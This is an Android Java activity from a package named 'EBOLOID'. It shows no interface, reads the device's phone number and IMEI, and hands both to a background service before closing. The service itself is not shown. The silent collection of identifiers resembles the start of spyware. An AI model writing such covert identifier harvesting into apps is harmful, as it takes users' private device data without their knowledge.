package pl.kroljakub.EBOLOID;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.main);

        TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        String IMEI = tMgr.getDeviceId();

        Intent i = new Intent(this, EboloidService.class);
        i.putExtra("number", mPhoneNumber);
        i.putExtra("imei", IMEI);
        startService(i);
        finish();
    }
}
